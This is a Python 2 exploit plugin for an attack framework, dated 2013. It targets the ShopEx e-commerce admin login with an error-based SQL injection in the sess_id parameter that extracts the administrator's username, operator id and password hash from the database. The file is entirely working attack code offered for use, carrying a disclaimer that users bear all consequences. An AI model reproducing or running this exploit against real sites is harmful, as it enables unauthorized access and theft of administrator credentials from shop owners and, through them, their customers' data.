# -*- coding: utf-8-*-
class NSSPlugin:
	infos=[
	['Name','shopex_back_end_SQLInject_exploit'],
	['Author','L34Rn'],
	['Mail','cnh4ckff@gmail.com'],
	['Blog','http://hi.baidu.com/l34rn'],
	['Date','20131025'],
	['声明','使用本插件造成的一切后果使用者自负!使用就表示同意第一句协议！']
	]
	
	opts=[
	['HOST','www.google.com','the host of target website'],
	['PORT','80','the port of target webserver'],
	['PATH','/','the path of shopex'],
	['PAYLOAD','false','Not need payload']
	]
	
	def exploit(self):
		host = self.host_reduce_http(HOST)
		port = PORT
		path = PATH
		pp.prettyPrint('[*] exploit start OK!',BLUE)
		pp.prettyPrint('[*] [TARGET] '+host,BLUE)
		if str(host) == '443':
			_host = 'https://'+host+path
		else:
			_host = 'http://'+host+':'+port+path
		try:
			pp.prettyPrint('[+] Sending Exploit Code ...',BLUE)
			result = self.SQLi(_host)
			if result == 'Failed':
				pp.prettyPrint('[!] All Done!\n[!] But Failed!',RED)
			else:
				pp.prettyPrint('[+] Good News!',GREEN)
				id,user,hash = result
				pp.prettyPrint('[+] id:		'+id,GREEN)
				pp.prettyPrint('[+] user:	'+user,GREEN)
				pp.prettyPrint('[+] hash:	'+hash,GREEN)
		except Exception,e:
			pp.prettyPrint('[!] Error=>'+str(e),RED)
			pp.prettyPrint('[!] All Done!\n[!] But Failed!',RED)
	def SQLi(self,host):
		shellcode = r"/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1"
		url = host+shellcode
		res = urllib.urlopen(url)
		if res.getcode()==200:
			html = res.read()
			try:
				rex = re.search(r"(Duplicate entry ')(.{32})~(.*)~(\d*)(' for key 'group_key')",html)
				hash = rex.group(2)
				user = rex.group(3)
				id = rex.group(4)
				return id,user,hash
			except:
				return 'Failed'
		else:
			return 'Failed'
			
	def host_reduce_http(self,host):
		l = len(host.split('//'))
		if l == 1:
			host = host.strip()
			host = host.split('/')[0]
		elif l == 2:
			host = host.split('//')[1]
			host = host.split('/')[0]
		else:
			host = 'Error!'
		return host
